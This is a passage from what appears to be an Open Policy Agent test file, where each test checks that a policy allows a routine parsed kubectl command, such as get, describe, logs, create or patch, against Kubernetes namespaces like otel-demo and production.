    policy.allow with input as {"command": {"verb": "describe", "resource": "service", "namespace": "otel-demo", "args": ["quote"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe service quote -n otel-demo"}
}

test_allow_133 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pods", "namespace": "otel-demo", "args": ["checkout"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pods checkout -n otel-demo"}
}

test_allow_134 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployments", "namespace": "default", "args": ["cart", "payment", "ad"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl describe deployments -n default cart payment ad"}
}

test_allow_135 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "daemonsets", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl get daemonsets -n default"}
}

test_allow_136 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "service", "namespace": null, "args": ["cart-service"], "flags": []}, "original_command": "kubectl describe service cart-service"}
}

test_allow_137 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pods", "namespace": "production", "args": [], "flags": [{"name": "-n", "value": "production"}]}, "original_command": "kubectl describe pods -n production"}
}

test_allow_138 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": null, "args": [], "flags": [{"name": "--all-namespaces", "value": null}, {"name": "-l", "value": "redis-sentinel"}]}, "original_command": "kubectl get services --all-namespaces -l redis-sentinel"}
}

test_allow_139 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "complex-us", "args": [], "flags": [{"name": "-n", "value": "complex-us"}, {"name": "-o", "value": "yaml"}, {"name": "-l", "value": "app=frontend-service"}]}, "original_command": "kubectl get deployment -n complex-us -o yaml -l app=frontend-service"}
}

test_allow_140 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": "chaos-mesh", "args": [], "flags": [{"name": "-n", "value": "chaos-mesh"}]}, "original_command": "kubectl get services -n chaos-mesh"}
}

test_allow_141 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "production", "args": ["email-service"], "flags": [{"name": "-n", "value": "production"}]}, "original_command": "kubectl describe pod email-service -n production"}
}

test_allow_142 if {
    policy.allow with input as {"command": {"verb": "create", "resource": "deployment", "namespace": "otel-demo", "args": ["adservice"], "flags": [{"name": "--image", "value": "<image-name>"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl create deployment adservice --image=<image-name> -n otel-demo"}
}

test_allow_143 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "services", "namespace": "production", "args": ["frontend"], "flags": [{"name": "-n", "value": "production"}]}, "original_command": "kubectl describe services frontend -n production"}
}

test_allow_144 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "default", "args": [], "flags": [{"name": "-l", "value": "app=my-service"}, {"name": "-n", "value": "default"}]}, "original_command": "kubectl get pods -l app=my-service -n default"}
}

test_allow_145 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "service", "namespace": "otel-demo", "args": ["ad"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get service ad -n otel-demo"}
}

test_allow_146 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "staging", "args": ["frontend"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "staging"}]}, "original_command": "kubectl get deployment frontend -o yaml -n staging"}
}

test_allow_147 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pods", "namespace": "clickhouse", "args": [], "flags": [{"name": "-n", "value": "clickhouse"}]}, "original_command": "kubectl describe pods -n clickhouse"}
}

test_allow_148 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["frontend-77c7685488-w7zmp"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs frontend-77c7685488-w7zmp -n otel-demo"}
}

test_allow_149 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "configmap", "namespace": "openshift-image-registry", "args": ["image-registry-configuration"], "flags": [{"name": "-n", "value": "openshift-image-registry"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get configmap image-registry-configuration -n openshift-image-registry -o yaml"}
}

test_allow_150 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "service", "namespace": null, "args": ["shipping"], "flags": [{"name": "-o", "value": "jsonpath={.metadata.namespace}"}]}, "original_command": "kubectl get service shipping -o jsonpath=\"{.metadata.namespace}\""}
}

test_allow_151 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "otel-demo", "args": ["shipping"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get deployment shipping -n otel-demo"}
}

test_allow_152 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "otel-demo", "args": ["recommendation"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe deployment recommendation -n otel-demo"}
}

test_allow_153 if {
    policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "otel-demo", "args": ["ad"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\": \"add\", \"path\": \"/spec/template/spec/containers/0/env/-\", \"value\": {\"name\": \"GRPC_RETRY_CONFIG\", \"value\": \"<your-grpc-retry-config>\"}}]"}]}, "original_command": "kubectl patch deployment ad -n otel-demo --type=\"json\" -p=\"[{\"op\": \"add\", \"path\": \"/spec/template/spec/containers/0/env/-\", \"value\": {\"name\": \"GRPC_RETRY_CONFIG\", \"value\": \"<your-grpc-retry-config>\"}}]\""}
}

test_allow_154 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "complex-us", "args": ["backend-service"], "flags": [{"name": "-n", "value": "complex-us"}]}, "original_command": "kubectl get deployment backend-service -n complex-us"}
}

test_allow_155 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "daemonset", "namespace": null, "args": ["frontend-proxy"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-A", "value": null}]}, "original_command": "kubectl get daemonset frontend-proxy -o yaml -A"}
}

test_allow_156 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "svc", "namespace": null, "args": ["frontend-proxy"], "flags": []}, "original_command": "kubectl get svc frontend-proxy"}
}

test_allow_157 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "configmap", "namespace": "otel-demo", "args": ["flagd-config"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get configmap flagd-config -n otel-demo -o yaml"}
}

test_allow_158 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "*", "args": [], "flags": [{"name": "-o", "value": "wide"}, {"name": "-n", "value": "*"}]}, "original_command": "kubectl get deployments -o wide -n *"}
}

test_allow_159 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "default", "args": ["jaeger-collector"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl describe deployment jaeger-collector -n default"}
}

test_allow_160 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "default", "args": ["ad"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "default"}]}, "original_command": "kubectl get deployment ad -o yaml -n default"}
}

test_allow_161 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pod", "namespace": null, "args": [], "flags": [{"name": "-l", "value": "app=frontend-proxy"}, {"name": "-o", "value": "jsonpath={.items[0].metadata.namespace}"}]}, "original_command": "kubectl get pod -l app=frontend-proxy -o jsonpath=\"{.items[0].metadata.namespace}\""}
}

test_allow_162 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "node", "namespace": null, "args": ["100.96.1.81"], "flags": []}, "original_command": "kubectl describe node 100.96.1.81"}
}

test_allow_163 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": null, "args": [], "flags": [{"name": "--all-namespaces", "value": null}, {"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end}"}]}, "original_command": "kubectl get deployments --all-namespaces -o jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end}\""}
}

test_allow_164 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["email-69965c8d54-2jvkd"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs email-69965c8d54-2jvkd -n otel-demo"}
}

test_allow_165 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "configmap", "namespace": "otel-demo", "args": ["ad-config"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe configmap ad-config -n otel-demo"}
}

test_allow_166 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployments,pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "app=checkout,shipping,frontend,frontend-proxy"}]}, "original_command": "kubectl describe deployments,pods -n otel-demo -l app=checkout,shipping,frontend,frontend-proxy"}
}

test_allow_167 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "namespaces", "namespace": null, "args": [], "flags": []}, "original_command": "kubectl describe namespaces"}
}

test_allow_168 if {
    policy.allow with input as {"command": {"verb": "create", "resource": "deployment", "namespace": "otel-demo", "args": ["adservice"], "flags": [{"name": "--image", "value": "adservice:latest"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl create deployment adservice --image=adservice:latest -n otel-demo"}
}

test_allow_169 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "default", "args": [], "flags": [{"name": "-l", "value": "app=frontend"}, {"name": "-n", "value": "default"}]}, "original_command": "kubectl get pods -l app=frontend -n default"}
}

test_allow_170 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "default", "args": ["frontend-api"], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl describe deployment frontend-api -n default -o yaml"}
}

test_allow_171 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["email"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs email -n otel-demo"}
}

test_allow_172 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment,pod", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get deployment,pod -n otel-demo"}
}

test_allow_173 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "otel-demo", "args": ["quote"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pod quote -n otel-demo"}
}

test_allow_174 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "shipping", "args": [], "flags": [{"name": "-n", "value": "shipping"}]}, "original_command": "kubectl get pods -n shipping"}
}

test_allow_175 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pod", "namespace": "otel-demo", "args": ["product-catalog"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get pod product-catalog -n otel-demo -o yaml"}
}

test_allow_176 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment,pods", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-l", "value": "service=frontend"}]}, "original_command": "kubectl get deployment,pods -n default -l service=frontend"}
}

test_allow_177 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "otel-demo", "args": ["ad-fc478dd44-9cgmv"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pod ad-fc478dd44-9cgmv -n otel-demo"}
}

test_allow_178 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "otel-demo", "args": ["payment-759fdc546d"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe deployment payment-759fdc546d -n otel-demo"}
}

test_allow_179 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": null, "args": ["ad"], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment ad -o yaml"}
}

test_allow_180 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pod", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-l", "value": "app=frontend"}]}, "original_command": "kubectl get pod -n default -l app=frontend"}
}